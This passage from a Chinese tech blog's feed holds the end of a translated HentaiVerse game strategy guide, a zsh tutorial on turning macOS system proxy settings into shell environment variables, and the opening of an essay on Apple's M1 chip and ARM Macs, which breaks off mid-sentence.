带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 